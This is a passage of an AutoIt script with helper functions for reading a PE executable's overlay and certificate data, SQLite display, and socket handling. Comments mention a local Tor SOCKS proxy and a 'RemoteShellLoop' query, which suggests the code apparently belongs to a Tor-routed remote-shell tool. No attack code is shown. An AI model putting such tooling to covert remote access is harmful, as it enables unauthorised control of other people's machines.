				DllStructSetData($stEndian, 1, BinaryMid($bBuffer, $iOffset + 16, 4))
				$nLastSectionSz = DllStructGetData($stEndian, 1)
			EndIf
			; Next IMAGE_SECTION_HEADER
			$iOffset += 40
		Next
;~ 		ConsoleWrite("$nLastSectionOffset = " & $nLastSectionOffset & ", $nLastSectionSz = " & $nLastSectionSz & @CRLF)

		$iSucces = 1 ; Everything was read in correctly
	Until 1
	$iErr = @error
	FileClose($hFile)
	; No Success?
	If Not $iSucces Then Return SetError($iExit, $iErr, $aRet)

;~ 	Now to calculate the last section offset and size to get the 'real' Executable end-of-file
	; [0] = Overlay Start
	$aRet[0] = $nLastSectionOffset + $nLastSectionSz

	; Less than FileSize means there's Overlay info
	If $aRet[0] And $aRet[0] < $nFileSize Then
		; Certificate start after last section? It should
		If $iCertificateAddress >= $aRet[0] Then
			; Get size of overlay IF Certificate doesn't start right after last section
			; 'squeezed-in overlay'
			$aRet[1] = $iCertificateAddress - $aRet[0]
		Else
			; No certificate, or < last section - overlay will be end of last section -> end of file
			$aRet[1] = $nFileSize - $aRet[0]
		EndIf
		; Size of Overlay = 0 ?  Reset overlay start to 0
		If Not $aRet[1] Then $aRet[0] = 0
	EndIf
	$aRet[2] = $iCertificateAddress
	$aRet[3] = $nCertificateSz
	$aRet[4] = $nFileSize
	Return $aRet
EndFunc   ;==>_PEFileGetOverlayInfo

Func _ErrFunc($oError)
    ; Do anything here.
    ConsoleWrite(@ScriptName & " (" & $oError.scriptline & ") : ==> COM Error intercepted !" & @CRLF & _
            @TAB & "err.number is: " & @TAB & @TAB & "0x" & Hex($oError.number) & @CRLF & _
            @TAB & "err.windescription:" & @TAB & $oError.windescription & @CRLF & _
            @TAB & "err.description is: " & @TAB & $oError.description & @CRLF & _
            @TAB & "err.source is: " & @TAB & @TAB & $oError.source & @CRLF & _
            @TAB & "err.helpfile is: " & @TAB & $oError.helpfile & @CRLF & _
            @TAB & "err.helpcontext is: " & @TAB & $oError.helpcontext & @CRLF & _
            @TAB & "err.lastdllerror is: " & @TAB & $oError.lastdllerror & @CRLF & _
            @TAB & "err.scriptline is: " & @TAB & $oError.scriptline & @CRLF & _
            @TAB & "err.retcode is: " & @TAB & "0x" & Hex($oError.retcode) & @CRLF & @CRLF)
EndFunc

Func _ShowSqlTbl($hDB, $sTblName) ;function to list sql tables in console
	Local $aResult, $iRows, $iColumns, $iRval
	$iRval = _SQLite_GetTable2d($hDB, "SELECT * FROM " & $sTblName & ";", $aResult, $iRows, $iColumns)
	If $iRval = $SQLITE_OK Then
		_SQLite_Display2DResult($aResult)
	Else
		ConsoleWrite("SQLite Error: " & $iRval & " | " & _SQLite_ErrMsg($hDB) & @CRLF)
	EndIf
EndFunc

Func _OEMToAnsi($sOEM)
	Local $a_AnsiFName = DllCall('user32.dll', 'Int', 'OemToChar', 'str', $sOEM, 'str', '')
	If @error = 0 Then $sAnsi = $a_AnsiFName[2]
	Return $sAnsi
EndFunc

Func _AnsiToOEM($sOEM)
	Local $a_AnsiFName = DllCall('user32.dll', 'Int', 'CharToOem', 'str', $sOEM, 'str', '')
	If @error = 0 Then $sAnsi = $a_AnsiFName[2]
	Return $sAnsi
EndFunc

Func _SocketToIP($SHOCKET) ; IP of the connecting client. ; not in use casue we always only connect to 127.0.0.1:9050 (tor socks proxy)
	Local $sockaddr = DllStructCreate("short;ushort;uint;char[8]")
	Local $aRet = DllCall($hWS2_32, "int", "getpeername", "int", $SHOCKET, "ptr", DllStructGetPtr($sockaddr), "int*", DllStructGetSize($sockaddr))
	If Not @error And $aRet[0] = 0 Then
		$aRet = DllCall($hWS2_32, "str", "inet_ntoa", "int", DllStructGetData($sockaddr, 3))
		If Not @error Then $aRet = $aRet[0]
	Else
		$aRet = 0
	EndIf
	$sockaddr = 0
	Return $aRet
EndFunc

#cs
	ConsoleWrite("_exit1" & @CRLF)
	StopListen()
	ConsoleWrite("_exit2" & @CRLF)
	GUISetState(@SW_HIDE, $hGuiMain)
	ConsoleWrite("_exit3" & @CRLF)
;~ 	Sleep(5000) ;give sqlite time to backup and finalize statements
	$iResult = _SQLite_Close($hDBConnections)
	ConsoleWrite("sqlite close1: " & $iResult & @CRLF)
	While $iResult <> $SQLITE_OK
;~ 		_SQLite_Close($hDBConnections)
		$iResult = _SQLite_Close($hDBConnections)
		ConsoleWrite("sqlite close2: " & $iResult & @CRLF)
		_SQLite_QueryFinalize($hQueryReadConnection)
		_SQLite_QueryFinalize($hQueryGetDBCount)
		ConsoleWrite("_exit3.1" & @CRLF)
	WEnd
;~ 	MsgBox(0,"fertig","_exit")
	ConsoleWrite("_exit3.2" & @CRLF)
	_SQLite_Shutdown()
	ConsoleWrite("_exit4" & @CRLF)
	TCPShutdown()
	ConsoleWrite("_exit5" & @CRLF)
	Exit
	ConsoleWrite("_exit6" & @CRLF)
#ce



Func _Exit()
	If ProcessExists($iTorPID) Then
		ProcessClose($iTorPID)
		Sleep(100)
		DirRemove(@ScriptDir & "\TorClient", 1)
	EndIf
;~ 	Sleep(1000) ;give sqlite time to backup and finalize statements
;~ 	$iResult = _SQLite_Close($hDBConnections)
;~ 	MsgBox(0,"_exitmsg",$iResult)
;~ 	ConsoleWrite("sqlite close1: " & $iResult & @CRLF)
;~ 	While $iResult <> $SQLITE_OK
;~ 		_SQLite_Close($hDBConnections)
;~ 		$iResult = _SQLite_Close($hDBConnections)
;~ 		ConsoleWrite("sqlite close2: " & $iResult & @CRLF)
;~ 		_SQLite_QueryFinalize($hQueryReadConnection)
;~ 		_SQLite_QueryFinalize($hQueryLVRefresh)
;~ 		_SQLite_QueryFinalize($hQueryRemoteShellLoop)
;~ 		ConsoleWrite("_exit3.1" & @CRLF)
;~ 	WEnd

;~ 	_SQLite_Shutdown()
	TCPShutdown()
EndFunc

#EndRegion wrapper functions